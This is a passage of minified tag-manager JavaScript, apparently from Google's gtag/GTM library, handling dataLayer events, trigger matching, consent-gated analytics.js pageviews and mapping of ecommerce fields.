                r = n.slice(1),
                t = $e(p.join("."), 2);
              if (null != t) try {
                t[q].apply(t, r);
              } catch (C) {}
            }
          } else {
            var u = void 0,
              v = !1;
            if (Ca(d)) {
              a: {
                if (d.length && g(d[0])) {
                  var w = ls[d[0]];
                  if (w && (!e.fromContainerExecution || !ms[d[0]])) {
                    u = w(d, e);
                    break a;
                  }
                }
                u = void 0;
              }
              (v = u && "set" === d[0] && !!u.event) && J(101);
            } else u = d;
            if (u) {
              var x = Ts(u, e);
              a = x || a;
              v && x && J(113);
            }
          }
        } finally {
          e.fromContainerExecution && Ze(!0);
          var y = d["gtm.uniqueEventId"];
          if ("number" === typeof y) {
            for (var A = Ls[String(y)] || [], B = 0; B < A.length; B++) Ns.push(Xs(A[B]));
            A.length && Ns.sort(Qs);
            delete Ls[String(y)];
            y > Ks && (Ks = y);
          }
          Ps = !1;
        }
      }
    }
    return !a;
  }
  function Ys() {
    if (P(30)) {
      var a = Zs();
    }
    var e = Ws();
    try {
      ns(pg());
    } catch (f) {}
    return e;
  }
  function qr(a) {
    if (Ks < a.notBeforeEventId) {
      var b = String(a.notBeforeEventId);
      Ls[b] = Ls[b] || [];
      Ls[b].push(a);
    } else Ns.push(Xs(a)), Ns.sort(Qs), G(function () {
      Ps || Ws();
    });
  }
  function Xs(a) {
    return {
      message: a.message,
      messageContext: a.messageContext
    };
  }
  var $s = function () {
      function a(f) {
        var h = {};
        if (Is(f)) {
          var l = f;
          f = Is(l) ? l.getUntrustedMessageValue() : void 0;
          h.fromContainerExecution = !0;
        }
        return {
          message: f,
          messageContext: h
        };
      }
      var b = Lb(ze.da, []),
        c = Ae[ze.da] = Ae[ze.da] || {};
      !0 === c.pruned && J(83);
      Ls = or().get();
      rr();
      Vp(function () {
        if (!c.gtmDom) {
          c.gtmDom = !0;
          var f = {};
          b.push((f.event = "gtm.dom", f));
        }
      });
      ss(function () {
        if (!c.gtmLoad) {
          c.gtmLoad = !0;
          var f = {};
          b.push((f.event = "gtm.load", f));
        }
      });
      c.subscribers = (c.subscribers || 0) + 1;
      var d = b.push;
      b.push = function () {
        var f;
        if (0 < Ae.SANDBOXED_JS_SEMAPHORE) {
          f = [];
          for (var h = 0; h < arguments.length; h++) f[h] = new Js(arguments[h]);
        } else f = [].slice.call(arguments, 0);
        var l = f.map(function (q) {
          return a(q);
        });
        Ms.push.apply(Ms, l);
        var m = d.apply(b, f),
          n = Math.max(100, Number("1000") || 300);
        if (this.length > n) for (J(4), c.pruned = !0; this.length > n;) this.shift();
        var p = "boolean" !== typeof m || m;
        return Ws() && p;
      };
      var e = b.slice(0).map(function (f) {
        return a(f);
      });
      Ms.push.apply(Ms, e);
      Zs() && (P(30) && Ho(), G(Ys));
    },
    Zs = function () {
      var a = !0;
      return a;
    };
  function at(a) {
    if (null == a || 0 === a.length) return !1;
    var b = Number(a),
      c = Ja();
    return b < c + 3E5 && b > c - 9E5;
  }
  function bt(a) {
    return a && 0 === a.indexOf("pending:") ? at(a.substr(8)) : !1;
  }
  ;
  var wt = function () {};
  var Wc = {};
  Wc.se = new String("undefined");
  var Bt = function (a, b, c) {
      var d = {
        event: b,
        "gtm.element": a,
        "gtm.elementClasses": ac(a, "className"),
        "gtm.elementId": a["for"] || Wb(a, "id") || "",
        "gtm.elementTarget": a.formTarget || ac(a, "target") || ""
      };
      c && (d["gtm.triggers"] = c.join(","));
      d["gtm.elementUrl"] = (a.attributes && a.attributes.formaction ? a.formAction : "") || a.action || ac(a, "href") || a.src || a.code || a.codebase || "";
      return d;
    },
    Ct = function (a) {
      Ae.hasOwnProperty("autoEventsSettings") || (Ae.autoEventsSettings = {});
      var b = Ae.autoEventsSettings;
      b.hasOwnProperty(a) || (b[a] = {});
      return b[a];
    },
    Dt = function (a, b, c) {
      Ct(a)[b] = c;
    },
    Et = function (a, b, c, d) {
      var e = Ct(a),
        f = Ka(e, b, d);
      e[b] = c(f);
    },
    Ft = function (a, b, c) {
      var d = Ct(a);
      return Ka(d, b, c);
    };
  var Zt = z.clearTimeout,
    $t = z.setTimeout,
    U = function (a, b, c, d) {
      if (Vi()) {
        b && G(b);
      } else return Qb(a, b, c, d);
    },
    au = function () {
      return new Date();
    },
    bu = function () {
      return z.location.href;
    },
    cu = function (a) {
      return sj(uj(a), "fragment");
    },
    du = function (a) {
      return tj(uj(a));
    },
    eu = function (a, b) {
      return $e(a, b || 2);
    },
    fu = function (a, b, c) {
      var d;
      b ? (a.eventCallback = b, c && (a.eventTimeout = c), d = Rs(a)) : d = Rs(a);
      return d;
    },
    gu = function (a, b) {
      z[a] = b;
    },
    V = function (a, b, c) {
      b && (void 0 === z[a] || c && !z[a]) && (z[a] = b);
      return z[a];
    },
    hu = function (a, b, c) {
      return Ci(a, b, void 0 === c ? !0 : !!c);
    },
    iu = function (a, b, c) {
      return 0 === Li(a, b, c);
    },
    ju = function (a, b) {
      if (Vi()) {
        b && G(b);
      } else Sb(a, b);
    },
    ku = function (a) {
      return !!Ft(a, "init", !1);
    },
    lu = function (a) {
      Dt(a, "init", !0);
    },
    mu = function (a, b, c) {
      jc(a) || Zq(c, b, a);
    };
  function Ku(a, b) {
    function c(h) {
      var l = uj(h),
        m = sj(l, "protocol"),
        n = sj(l, "host", !0),
        p = sj(l, "port"),
        q = sj(l, "path").toLowerCase().replace(/\/$/, "");
      if (void 0 === m || "http" === m && "80" === p || "https" === m && "443" === p) m = "web", p = "default";
      return [m, n, p, q];
    }
    for (var d = c(String(a)), e = c(String(b)), f = 0; f < d.length; f++) if (d[f] !== e[f]) return !1;
    return !0;
  }
  function Lu(a) {
    return Mu(a) ? 1 : 0;
  }
  function Mu(a) {
    var b = a.arg0,
      c = a.arg1;
    if (a.any_of && Array.isArray(c)) {
      for (var d = 0; d < c.length; d++) {
        var e = H(a, {});
        H({
          arg1: c[d],
          any_of: void 0
        }, e);
        if (Lu(e)) return !0;
      }
      return !1;
    }
    switch (a["function"]) {
      case "_cn":
        return 0 <= String(b).indexOf(String(c));
      case "_css":
        var f;
        a: {
          if (b) try {
            for (var h = 0; h < xd.length; h++) {
              var l = xd[h];
              if (b[l]) {
                f = b[l](c);
                break a;
              }
            }
          } catch (v) {}
          f = !1;
        }
        return f;
      case "_ew":
        var m, n;
        m = String(b);
        n = String(c);
        var p = m.length - n.length;
        return 0 <= p && m.indexOf(n, p) === p;
      case "_eq":
        return String(b) === String(c);
      case "_ge":
        return Number(b) >= Number(c);
      case "_gt":
        return Number(b) > Number(c);
      case "_lc":
        return 0 <= String(b).split(",").indexOf(String(c));
      case "_le":
        return Number(b) <= Number(c);
      case "_lt":
        return Number(b) < Number(c);
      case "_re":
        var q;
        var r = a.ignore_case ? "i" : void 0;
        try {
          var t = String(c) + r,
            u = yd.get(t);
          u || (u = new RegExp(c, r), yd.set(t, u));
          q = u.test(b);
        } catch (v) {
          q = !1;
        }
        return q;
      case "_sw":
        return 0 === String(b).indexOf(String(c));
      case "_um":
        return Ku(b, c);
    }
    return !1;
  }
  ;
  function Nu() {
    var a = ["&cv=3", "&rv=" + ze.Gf, "&tc=" + Rc.filter(function (b) {
      return b;
    }).length];
    ze.md && a.push("&x=" + ze.md);
    return a.join("");
  }
  ;
  var Ou = function (a, b) {
      var c;
      c = b ? [On, Pn, Rn, Bn, Fn, Tn, Gn, Sn, Mn, Cn, Wn, Hn, Qn, zn, yn, Un, vn] : [Ul, An, qn, Dn, rn, sn, tn, un, In, Jn, Ln, Nn, En, Kn, Vn];
      for (var d = 0; d < c.length && (c[d](a), !a.isAborted); d++);
    },
    Pu = function (a, b, c, d) {
      var e = new wl(b, c, d);
      e.metadata.hit_type = a;
      e.metadata.speculative = !0;
      e.metadata.event_start_timestamp_ms = Ja();
      e.metadata.speculative_in_message = d.eventMetadata.speculative;
      return e;
    },
    Qu = function (a, b, c, d) {
      function e() {
        for (var r = 0; r < h.length; r++) {
          var t = h[r];
          t.isAborted || (Ou(h[r], !0), t.metadata.speculative || t.isAborted || fp(t));
        }
      }
      var f = el(a, d.isGtmEvent);
      if (f) {
        var h = [];
        if (d.eventMetadata.hit_type_override) {
          var l = d.eventMetadata.hit_type_override;
          Array.isArray(l) || (l = [l]);
          for (var m = 0; m < l.length; m++) {
            var n = Pu(l[m], f, b, d);
            n.metadata.speculative = !1;
            h.push(n);
          }
        } else b === K.g.la && h.push(Pu("landing_page", f, b, d)), h.push(Pu("conversion", f, b, d)), h.push(Pu("user_data_lead", f, b, d)), h.push(Pu("user_data_web", f, b, d)), h.push(Pu("remarketing", f, b, d));
        for (var p = 0; p < h.length; p++) Ou(h[p], !1);
        var q = [K.g.F];
        P(85) && q.push(K.g.K);
        bg(function () {
          for (var r = [], t = [], u = 0; u < h.length; u++) {
            var v = h[u];
            r.push(v.isAborted);
            t.push(v.metadata.speculative);
          }
          e();
          Q(q) || ag(function (w) {
            var x = w.consentEventId,
              y = w.consentPriorityId;
            if (Q(q)) {
              for (var A = 0; A < h.length; A++) {
                var B = h[A];
                B.metadata.consent_updated = !0;
                B.metadata.speculative = t[A];
                B.metadata.event_start_timestamp_ms = Ja();
                B.isAborted = r[A];
                B.metadata.consent_event_id = x;
                B.metadata.consent_priority_id = y;
              }
              e();
            }
          }, q);
        }, q);
      }
    };
  var qv = function () {
      var a = !0;
      hi(7) && hi(9) && hi(10) || (a = !1);
      return a;
    },
    rv = function () {
      var a = !0;
      hi(3) && hi(4) || (a = !1);
      return a;
    };
  var vv = function (a, b) {
      if (!b.isGtmEvent) {
        var c = T(b, K.g.Xa),
          d = T(b, K.g.nb),
          e = T(b, c);
        if (void 0 === e) {
          var f = void 0;
          sv.hasOwnProperty(c) ? f = sv[c] : tv.hasOwnProperty(c) && (f = tv[c]);
          1 === f && (f = uv(c));
          g(f) ? gq()(function () {
            var h = gq().getByName(a).get(f);
            d(h);
          }) : d(void 0);
        } else d(e);
      }
    },
    wv = function (a, b) {
      var c = a[K.g.Ib],
        d = b + ".",
        e = a[K.g.O] || "",
        f = void 0 === c ? !!a.use_anchor : "fragment" === c,
        h = !!a[K.g.rb];
      e = String(e).replace(/\s+/g, "").split(",");
      var l = gq();
      l(d + "require", "linker");
      l(d + "linker:autoLink", e, f, h);
    },
    Av = function (a, b, c) {
      if (Of() && (!c.isGtmEvent || !xv[a])) {
        var d = !Q(K.g.N),
          e = function (f) {
            var h,
              l,
              m = gq(),
              n = yv(b, "", c),
              p,
              q = n.createOnlyFields._useUp;
            if (c.isGtmEvent || zv(b, n.createOnlyFields)) {
              c.isGtmEvent && (h = "gtm" + Ue(), l = n.createOnlyFields, n.gtmTrackerName && (l.name = h));
              m(function () {
                var t = m.getByName(b);
                t && (p = t.get("clientId"));
                c.isGtmEvent || m.remove(b);
              });
              m("create", a, c.isGtmEvent ? l : n.createOnlyFields);
              d && Q(K.g.N) && (d = !1, m(function () {
                var t = gq().getByName(c.isGtmEvent ? h : b);
                !t || t.get("clientId") == p && q || (c.isGtmEvent ? (n.fieldsToSet["&gcu"] = "1", n.fieldsToSet["&sst.gcut"] = ue[f]) : (n.fieldsToSend["&gcu"] = "1", n.fieldsToSend["&sst.gcut"] = ue[f]), t.set(n.fieldsToSet), c.isGtmEvent ? t.send("pageview") : t.send("pageview", n.fieldsToSend));
              }));
              c.isGtmEvent && m(function () {
                m.remove(h);
              });
            }
          };
        ag(function () {
          return e(K.g.N);
        }, K.g.N);
        ag(function () {
          return e(K.g.F);
        }, K.g.F);
        c.isGtmEvent && (xv[a] = !0);
      }
    },
    Bv = function (a, b) {
      zp() && b && (a[K.g.Hb] = b);
    },
    Kv = function (a, b, c) {
      function d() {
        var F = T(c, K.g.Jc);
        l(function () {
          if (!c.isGtmEvent && ic(F)) {
            var L = u.fieldsToSend,
              M = m().getByName(n),
              S;
            for (S in F) if (F.hasOwnProperty(S) && /^(dimension|metric)\d+$/.test(S) && void 0 != F[S]) {
              var Z = M.get(uv(F[S]));
              Cv(L, S, Z);
            }
          }
        });
      }
      function e() {
        if (u.displayfeatures) {
          var F = "_dc_gtm_" + f.replace(/[^A-Za-z0-9-]/g, "");
          p("require", "displayfeatures", void 0, {
            cookieName: F
          });
        }
      }
      var f = a,
        h = "https://www.google-analytics.com/analytics.js",
        l = c.isGtmEvent ? iq(T(c, "gaFunctionName")) : iq();
      if (ta(l)) {
        var m = gq,
          n;
        c.isGtmEvent ? n = T(c, "name") || T(c, "gtmTrackerName") : n = "gtag_" + f.split("-").join("_");
        var p = function (F) {
            var L = [].slice.call(arguments, 0);
            L[0] = n ? n + "." + L[0] : "" + L[0];
            l.apply(window, L);
          },
          q = function (F) {
            var L = function (Y, ba) {
                for (var aa = 0; ba && aa < ba.length; aa++) p(Y, ba[aa]);
              },
              M = c.isGtmEvent,
              S = M ? Dv(u) : Ev(b, c);
            if (S) {
              var Z = {};
              Bv(Z, F);
              p("require", "ec", "ec.js", Z);
              M && S.Mf && p("set", "&cu", S.Mf);
              var R = S.action;
              if (M || "impressions" === R) if (L("ec:addImpression", S.di), !M) return;
              if ("promo_click" === R || "promo_view" === R || M && S.Kd) {
                var O = S.Kd;
                L("ec:addPromo", O);
                if (O && 0 < O.length && "promo_click" === R) {
                  M ? p("ec:setAction", R, S.Qa) : p("ec:setAction", R);
                  return;
                }
                if (!M) return;
              }
              "promo_view" !== R && "impressions" !== R && (L("ec:addProduct", S.Rb), p("ec:setAction", R, S.Qa));
            }
          },
          r = function (F) {
            if (F) {
              var L = {};
              if (ic(F)) for (var M in Fv) Fv.hasOwnProperty(M) && Gv(Fv[M], M, F[M], L);
              Bv(L, x);
              p("require", "linkid", L);
            }
          },
          t = function () {
            if (Vi()) {} else {
              var F = T(c, K.g.yj);
              F && (p("require", F, {
                dataLayer: ze.da
              }), p("require", "render"));
            }
          },
          u = yv(n, b, c),
          v = function (F, L, M) {
            M && (L = "" + L);
            u.fieldsToSend[F] = L;
          };
        !c.isGtmEvent && zv(n, u.createOnlyFields) && (l(function () {
          m() && m().remove(n);
        }), Hv[n] = !1);
        l("create", f, u.createOnlyFields);
        if (u.createOnlyFields[K.g.Hb] && !c.isGtmEvent) {
          var w = Ie || Ke ? yp(u.createOnlyFields[K.g.Hb], "/analytics.js") : void 0;
          w && (h = w);
        }
        var x = c.isGtmEvent ? u.fieldsToSet[K.g.Hb] : u.createOnlyFields[K.g.Hb];
        if (x) {
          var y = c.isGtmEvent ? u.fieldsToSet[K.g.ee] : u.createOnlyFields[K.g.ee];
          y && !Hv[n] && (Hv[n] = !0, l(Lq(n, y)));
        }
        c.isGtmEvent ? u.enableRecaptcha && p("require", "recaptcha", "recaptcha.js") : (d(), r(u.linkAttribution));
        var A = u[K.g.za];
        A && A[K.g.O] && wv(A, n);
        p("set", u.fieldsToSet);
        if (c.isGtmEvent) {
          if (u.enableLinkId) {
            var B = {};
            Bv(B, x);
            p("require", "linkid", "linkid.js", B);
          }
          Of() && Av(f, n, c);
        }
        if (b === K.g.ac) {
          if (c.isGtmEvent) {
            e();
            if (u.remarketingLists) {
              var C = "_dc_gtm_" + f.replace(/[^A-Za-z0-9-]/g, "");
              p("require", "adfeatures", {
                cookieName: C
              });
            }
            q(x);
            p("send", "pageview");
            u.createOnlyFields._useUp && jq(n + ".");
          } else t(), p("send", "pageview", u.fieldsToSend);
        } else b === K.g.la ? (t(), sl(f, c), T(c, K.g.vb) && (Uk(["aw", "dc"]), jq(n + ".")), 0 != u.sendPageView && p("send", "pageview", u.fieldsToSend), Av(f, n, c)) : b === K.g.Ha ? vv(n, c) : "screen_view" === b ? p("send", "screenview", u.fieldsToSend) : "timing_complete" === b ? (u.fieldsToSend.hitType = "timing", v("timingCategory", u.eventCategory, !0), c.isGtmEvent ? v("timingVar", u.timingVar, !0) : v("timingVar", u.name, !0), v("timingValue", Da(u.value)), void 0 !== u.eventLabel && v("timingLabel", u.eventLabel, !0), p("send", u.fieldsToSend)) : "exception" === b ? p("send", "exception", u.fieldsToSend) : "" === b && c.isGtmEvent || ("track_social" === b && c.isGtmEvent ? (u.fieldsToSend.hitType = "social", v("socialNetwork", u.socialNetwork, !0), v("socialAction", u.socialAction, !0), v("socialTarget", u.socialTarget, !0)) : ((c.isGtmEvent || Iv[b]) && q(x), c.isGtmEvent && e(), u.fieldsToSend.hitType = "event", v("eventCategory", u.eventCategory, !0), v("eventAction", u.eventAction || b, !0), void 0 !== u.eventLabel && v("eventLabel", u.eventLabel, !0), void 0 !== u.value && v("eventValue", Da(u.value))), p("send", u.fieldsToSend));
        if (!Jv && !c.isGtmEvent) {
          Jv = !0;
          var I = function () {
              c.onFailure();
            },
            E = function () {
              m().loaded || I();
            };
          Vi() ? G(E) : Qb(h, E, I);
        }
      } else G(c.onFailure);
    },
    Lv = function (a, b, c, d) {
      bg(function () {
        Kv(a, b, d);
      }, [K.g.N, K.g.F]);
    },
    Nv = function (a) {
      function b(e) {
        function f(l, m) {
          for (var n = 0; n < m.length; n++) {
            var p = m[n];
            if (e[p]) {
              h[l] = e[p];
              break;
            }
          }
        }
        var h = H(e);
        f("id", ["id", "item_id", "promotion_id"]);
        f("name", ["name", "item_name", "promotion_name"]);
        f("brand", ["brand", "item_brand"]);
        f("variant", ["variant", "item_variant"]);
        f("list", ["list_name", "item_list_name"]);
        f("position", ["list_position", "creative_slot", "index"]);
        (function () {
          if (e.category) h.category = e.category;else {
            for (var l = "", m = 0; m < Mv.length; m++) void 0 !== e[Mv[m]] && (l && (l += "/"), l += e[Mv[m]]);
            l && (h.category = l);
          }
        })();
        f("listPosition", ["list_position"]);
        f("creative", ["creative_name"]);
        f("list", ["list_name"]);
        f("position", ["list_position", "creative_slot"]);
        return h;
      }
      for (var c = [], d = 0; a && d < a.length; d++) a[d] && ic(a[d]) && c.push(b(a[d]));
      return c.length ? c : void 0;
    },
    Ov = function (a) {
      return Q(a);
    },
    Pv = !1;
  var Jv,
    Hv = {},
    xv = {},
    Qv = {},
    Rv = Object.freeze((Qv.page_hostname = 1, Qv[K.g.Z] = 1, Qv[K.g.jb] = 1, Qv[K.g.Oa] = 1, Qv[K.g.Ca] = 1, Qv[K.g.Pa] = 1, Qv[K.g.fc] = 1, Qv[K.g.Ic] = 1, Qv[K.g.Ja] = 1, Qv[K.g.kb] = 1, Qv[K.g.oa] = 1, Qv[K.g.Qc] = 1, Qv[K.g.Aa] = 1, Qv[K.g.sb] = 1, Qv)),
    Sv = {},
    sv = Object.freeze((Sv.client_storage = "storage", Sv.sample_rate = 1, Sv.site_speed_sample_rate = 1, Sv.store_gac = 1, Sv.use_amp_client_id = 1, Sv[K.g.Va] = 1, Sv[K.g.ya] = "storeGac", Sv[K.g.Oa] = 1, Sv[K.g.Ca] = 1, Sv[K.g.Pa] = 1, Sv[K.g.fc] = 1, Sv[K.g.Ic] = 1, Sv[K.g.kb] = 1, Sv)),
    Tv = {},
    Uv = Object.freeze((Tv._cs = 1, Tv._useUp = 1, Tv.allowAnchor = 1, Tv.allowLinker = 1, Tv.alwaysSendReferrer = 1, Tv.clientId = 1, Tv.cookieDomain = 1, Tv.cookieExpires = 1, Tv.cookieFlags = 1, Tv.cookieName = 1, Tv.cookiePath = 1, Tv.cookieUpdate = 1, Tv.legacyCookieDomain = 1, Tv.legacyHistoryImport = 1, Tv.name = 1, Tv.sampleRate = 1, Tv.siteSpeedSampleRate = 1, Tv.storage = 1, Tv.storeGac = 1, Tv.useAmpClientId = 1, Tv._cd2l = 1, Tv)),
    Vv = Object.freeze({
      anonymize_ip: 1
    }),
    Wv = {},
    tv = Object.freeze((Wv.campaign = {
      content: "campaignContent",
      id: "campaignId",
      medium: "campaignMedium",
      name: "campaignName",
      source: "campaignSource",
      term: "campaignKeyword"
    }, Wv.app_id = 1, Wv.app_installer_id = 1, Wv.app_name = 1, Wv.app_version = 1, Wv.description = "exDescription", Wv.fatal = "exFatal", Wv.language = 1, Wv.page_hostname = "hostname", Wv.transport_type = "transport", Wv[K.g.na] = "currencyCode", Wv[K.g.gh] = 1, Wv[K.g.oa] = "location", Wv[K.g.Qc] = "page", Wv[K.g.Aa] = "referrer", Wv[K.g.sb] = "title", Wv[K.g.vf] = 1, Wv[K.g.wa] = 1, Wv)),
    Xv = {},
    Yv = Object.freeze((Xv.content_id = 1, Xv.event_action = 1, Xv.event_category = 1, Xv.event_label = 1, Xv.link_attribution = 1, Xv.name = 1, Xv[K.g.za] = 1, Xv[K.g.fh] = 1, Xv[K.g.Ka] = 1, Xv[K.g.aa] = 1, Xv)),
    Zv = Object.freeze({
      displayfeatures: 1,
      enableLinkId: 1,
      enableRecaptcha: 1,
      eventAction: 1,
      eventCategory: 1,
      eventLabel: 1,
      gaFunctionName: 1,
      gtmEcommerceData: 1,
      gtmTrackerName: 1,
      linker: 1,
      remarketingLists: 1,
      socialAction: 1,
      socialNetwork: 1,
      socialTarget: 1,
      timingVar: 1,
      value: 1
    }),
    Mv = Object.freeze(["item_category", "item_category2", "item_category3", "item_category4", "item_category5"]),
    $v = {},
    Fv = Object.freeze(($v.levels = 1, $v[K.g.Ca] = "duration", $v[K.g.fc] = 1, $v)),
    aw = {},
    bw = Object.freeze((aw.anonymize_ip = 1, aw.fatal = 1, aw.send_page_view = 1, aw.store_gac = 1, aw.use_amp_client_id = 1, aw[K.g.ya] = 1, aw[K.g.gh] = 1, aw)),
    Gv = function (a, b, c, d) {
      if (void 0 !== c) if (bw[b] && (c = Ea(c)), "anonymize_ip" !== b || c || (c = void 0), 1 === a) d[uv(b)] = c;else if (g(a)) d[a] = c;else for (var e in a) a.hasOwnProperty(e) && void 0 !== c[e] && (d[a[e]] = c[e]);
    },
    uv = function (a) {
      return a && g(a) ? a.replace(/(_[a-z])/g, function (b) {
        return b[1].toUpperCase();
      }) : a;
    },
    cw = {},
    Iv = Object.freeze((cw.checkout_progress = 1, cw.select_content = 1, cw.set_checkout_option = 1, cw[K.g.Wb] = 1, cw[K.g.Xb] = 1, cw[K.g.Eb] = 1, cw[K.g.Yb] = 1, cw[K.g.Ta] = 1, cw[K.g.hb] = 1, cw[K.g.Ua] = 1, cw[K.g.ka] = 1, cw[K.g.Zb] = 1, cw[K.g.xa] = 1, cw)),
    dw = {},
    ew = Object.freeze((dw.checkout_progress = 1, dw.set_checkout_option = 1, dw[K.g.Cg] = 1, dw[K.g.Dg] = 1, dw[K.g.Wb] = 1, dw[K.g.Xb] = 1, dw[K.g.Eg] = 1, dw[K.g.Eb] = 1, dw[K.g.ka] = 1, dw[K.g.Zb] = 1, dw[K.g.Fg] = 1, dw)),
    fw = {},
    gw = Object.freeze((fw.generate_lead = 1, fw.login = 1, fw.search = 1, fw.select_content = 1, fw.share = 1, fw.sign_up = 1, fw.view_search_results = 1, fw[K.g.Yb] = 1, fw[K.g.Ta] = 1, fw[K.g.hb] = 1, fw[K.g.Ua] = 1, fw[K.g.xa] = 1, fw)),
    hw = function (a) {
      var b = "general";
      ew[a] ? b = "ecommerce" : gw[a] ? b = "engagement" : "exception" === a && (b = "error");
      return b;
    },
    iw = {},
    jw = Object.freeze((iw.view_search_results = 1, iw[K.g.Ta] = 1, iw[K.g.Ua] = 1, iw[K.g.xa] = 1, iw)),
    Cv = function (a, b, c) {
      a.hasOwnProperty(b) || (a[b] = c);
    },
    kw = function (a) {
      if (va(a)) {
        for (var b = [], c = 0; c < a.length; c++) {
          var d = a[c];
          if (void 0 != d) {
            var e = d.id,
              f = d.variant;
            void 0 != e && void 0 != f && b.push(String(e) + "." + String(f));
          }
        }
        return 0 < b.length ? b.join("!") : void 0;
      }
    },
    yv = function (a, b, c) {
      var d = function (M) {
          return T(c, M);
        },
        e = {},
        f = {},
        h = {},
        l = {},
        m = kw(d(K.g.wj));
      !c.isGtmEvent && m && Cv(f, "exp", m);
      h["&gtm"] = Xi(!0);
      c.isGtmEvent || (h._no_slc = !0);
      Of() && (l._cs = Ov);
      var n = d(K.g.Jc);
      if (!c.isGtmEvent && ic(n)) for (var p in n) if (n.hasOwnProperty(p) && /^(dimension|metric)\d+$/.test(p) && void 0 != n[p]) {
        var q = d(String(n[p]));
        void 0 !== q && Cv(f, p, q);
      }
      for (var r = !c.isGtmEvent, t = Zg(c), u = 0; u < t.length; ++u) {
        var v = t[u];
        if (c.isGtmEvent) {
          var w = d(v);
          Zv.hasOwnProperty(v) ? e[v] = w : Uv.hasOwnProperty(v) ? l[v] = w : h[v] = w;
        } else {
          var x = void 0;
          x = v !== K.g.W ? d(v) : $g(c, v);
          if (Yv.hasOwnProperty(v)) Gv(Yv[v], v, x, e);else if (Vv.hasOwnProperty(v)) Gv(Vv[v], v, x, h);else if (tv.hasOwnProperty(v)) Gv(tv[v], v, x, f);else if (sv.hasOwnProperty(v)) Gv(sv[v], v, x, l);else if (/^(dimension|metric|content_group)\d+$/.test(v)) Gv(1, v, x, f);else if (v === K.g.W) {
            if (!Pv) {
              var y = Sa(x);
              y && (f["&did"] = y);
            }
            var A = void 0,
              B = void 0;
            b === K.g.la ? A = Sa($g(c, v), ".") : (A = Sa($g(c, v, 1), "."), B = Sa($g(c, v, 2), "."));
            A && (f["&gdid"] = A);
            B && (f["&edid"] = B);
          } else v === K.g.Ja && 0 > t.indexOf(K.g.fc) && (l.cookieName = x + "_ga");
          P(44) && Rv[v] && (c.C.hasOwnProperty(v) || b === K.g.la && c.h.hasOwnProperty(v)) && (r = !1);
        }
      }
      P(44) && r && (f["&jsscut"] = "1");
      !1 !== d(K.g.ef) && !1 !== d(K.g.jb) && qv() || (h.allowAdFeatures = !1);
      ni(c) && rv() ? P(54) && (h.allowAdPersonalizationSignals = !0) : h.allowAdPersonalizationSignals = !1;
      !c.isGtmEvent && d(K.g.vb) && (l._useUp = !0);
      if (c.isGtmEvent) {
        l.name = l.name || e.gtmTrackerName;
        var C = h.hitCallback;
        h.hitCallback = function () {
          ta(C) && C();
          c.onSuccess();
        };
      } else {
        Cv(l, "cookieDomain", "auto");
        Cv(h, "forceSSL", !0);
        Cv(e, "eventCategory", hw(b));
        jw[b] && Cv(f, "nonInteraction", !0);
        "login" === b || "sign_up" === b || "share" === b ? Cv(e, "eventLabel", d(K.g.fh)) : "search" === b || "view_search_results" === b ? Cv(e, "eventLabel", d(K.g.Gj)) : "select_content" === b && Cv(e, "eventLabel", d(K.g.nj));
        var I = e[K.g.za] || {},
          E = I[K.g.jc];
        E || 0 != E && I[K.g.O] ? l.allowLinker = !0 : !1 === E && Cv(l, "useAmpClientId", !1);
        f.hitCallback = c.onSuccess;
        l.name = a;
      }
      Of() && (h["&gcs"] = oi(), P(50) && (h["&gcd"] = si(c)), Q(K.g.N) || (l.storage = "none"), Q(K.g.F) || (h.allowAdFeatures = !1, l.storeGac = !1));
      P(52) && (wi() && (h["&dma_cps"] = ti()), h["&dma"] = vi());
      var F = Ap(c) || d(K.g.Hb),
        L = d(K.g.ee);
      F && (c.isGtmEvent || (l[K.g.Hb] = F), l._cd2l = !0);
      L && !c.isGtmEvent && (l[K.g.ee] = L);
      e.fieldsToSend = f;
      e.fieldsToSet = h;
      e.createOnlyFields = l;
      return e;
    },
    Dv = function (a) {
      var b = a.gtmEcommerceData;
      if (!b) return null;
      var c = {};
      b.currencyCode && (c.Mf = b.currencyCode);
      if (b.impressions) {
        c.action = "impressions";
        var d = b.impressions;
        c.di = "impressions" === b.translateIfKeyEquals ? Nv(d) : d;
      }
      if (b.promoView) {
        c.action = "promo_view";
        var e = b.promoView.promotions;
        c.Kd = "promoView" === b.translateIfKeyEquals ? Nv(e) : e;
      }
      if (b.promoClick) {
        c.action = "promo_click";
        var f = b.promoClick.promotions;
        c.Kd = "promoClick" === b.translateIfKeyEquals ? Nv(f) : f;
        c.Qa = b.promoClick.actionField;
        return c;
      }
      for (var h in b) if (b.hasOwnProperty(h) && "translateIfKeyEquals" !== h && "impressions" !== h && "promoView" !== h && "promoClick" !== h && "currencyCode" !== h) {
        c.action = h;
        var l = b[h].products;
        c.Rb = "products" === b.translateIfKeyEquals ? Nv(l) : l;
        c.Qa = b[h].actionField;
        break;
      }
      return Object.keys(c).length ? c : null;
    },
    Ev = function (a, b) {
      function c(u) {
        return {
          id: d(K.g.qa),
          affiliation: d(K.g.Jg),
          revenue: d(K.g.aa),
          tax: d(K.g.kf),
          shipping: d(K.g.Mc),
          coupon: d(K.g.Kg),
          list: d(K.g.jf) || d(K.g.Lc) || u
        };
      }
      for (var d = function (u) {
          return T(b, u);
        }, e = d(K.g.T), f, h = 0; e && h < e.length && !(f = e[h][K.g.jf] || e[h][K.g.Lc]); h++);
      var l = d(K.g.Jc);
      if (ic(l)) for (var m = 0; e && m < e.length; ++m) {
        var n = e[m],
          p;
        for (p in l) l.hasOwnProperty(p) && /^(dimension|metric)\d+$/.test(p) && void 0 != l[p] && Cv(n, p, n[l[p]]);
      }
      var q = null,
        r = d(K.g.rj);
      if (a === K.g.ka || a === K.g.Zb) q = {
        action: a,
        Qa: c(),
        Rb: Nv(e)
      };else if (a === K.g.Wb) q = {
        action: "add",
        Qa: c(),
        Rb: Nv(e)
      };else if (a === K.g.Xb) q = {
        action: "remove",
        Qa: c(),
        Rb: Nv(e)
      };else if (a === K.g.xa) q = {
        action: "detail",
        Qa: c(f),
        Rb: Nv(e)
      };else if (a === K.g.Ta) q = {
        action: "impressions",
        di: Nv(e)
      };else if (a === K.g.Ua) q = {
        action: "promo_view",
        Kd: Nv(r) || Nv(e)
      };else if ("select_content" === a && r && 0 < r.length || a === K.g.hb) q = {
        action: "promo_click",
        Kd: Nv(r) || Nv(e)
      };else if ("select_content" === a || a === K.g.Yb) q = {
        action: "click",
        Qa: {
          list: d(K.g.jf) || d(K.g.Lc) || f
        },
        Rb: Nv(e)
      };else if (a === K.g.Eb || "checkout_progress" === a) {
        var t = {
          step: a === K.g.Eb ? 1 : d(K.g.hf),
          option: d(K.g.Xd)
